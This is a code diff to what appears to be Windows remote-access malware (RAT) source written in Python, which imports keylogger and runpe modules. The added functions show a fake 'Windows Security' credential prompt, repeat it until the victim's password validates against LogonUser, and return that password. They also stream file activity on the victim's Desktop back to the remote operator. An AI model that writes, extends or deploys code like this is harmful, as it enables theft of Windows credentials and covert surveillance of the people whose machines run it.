@@ -37,9 +37,11 @@ import win32profile
 import win32security
 import win32service
 import win32ts
+import winerror
 import wmi
 from Crypto.Cipher import AES
 
+import filewatch
 import keylogger
 import runpe
 
@@ -627,6 +629,22 @@ class Command:
             return 0, '[-] Error: {}'.format(exception)
 
     @staticmethod
+    def askpass_logon():
+        try:
+            cmd1 = '$cred=$host.ui.promptforcredential(\'Windows Security\',\'\',[Environment]::Username,' \
+                   '[Environment]::UserDomainName); '
+            cmd2 = 'echo $cred.getnetworkcredential().password;'
+            while True:
+                p = subprocess.Popen('powershell.exe "{} {}"'.format(cmd1, cmd2), shell=True, stdout=subprocess.PIPE,
+                                     stderr=subprocess.PIPE)
+                username = os.getlogin()
+                password = p.stdout.read().decode().strip()
+                if Helper.logon_user(username, password):
+                    return 1, password
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
     def askuac():
         try:
             if not ctypes.windll.shell32.IsUserAnAdmin():
@@ -723,6 +741,8 @@ class Command:
     @staticmethod
     def open_url(url):
         try:
+            if not url:
+                return 0, '[-] URL required'
             webbrowser.open(url)
             return 1, '[+] Success'
         except Exception as exception:
@@ -750,6 +770,29 @@ class Command:
                 return 0, '[-] Operation requires elevation'
         except Exception as exception:
             return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def filewatch(client, path=None):
+        event = threading.Event()
+
+        def func(result):
+            client.send_text(1, result)
+
+        def eof():
+            client.send_text(-1, 'null')
+            event.set()
+
+        if path is None or not os.path.exists(path):
+            path = os.path.join(os.path.expanduser('~'), 'Desktop')
+        fw = filewatch.FileWatch().get_instance()
+        fw.start_monitor(path, func, eof)
+        while True:
+            cmd = client.recv()
+            print(cmd)
+            if cmd == 'stop':
+                fw.stop_monitor()
+                event.wait()
+                break
 
 
 class Helper:
@@ -963,6 +1006,20 @@ class Helper:
             return '0/3 (Disabled)'
         else:
             return None
+
+    @staticmethod
+    def logon_user(username, password):
+        try:
+            token = win32security.LogonUser(username, None, password, win32security.LOGON32_LOGON_INTERACTIVE,
+                                            win32security.LOGON32_PROVIDER_DEFAULT)
+            token.Close()
+            return True
+        except win32security.error as e:
+            if e.winerror == winerror.ERROR_ACCOUNT_RESTRICTION:
+                return True
+            if e.winerror == winerror.ERROR_LOGON_FAILURE:
+                return False
+            return False
 
 
 while True:
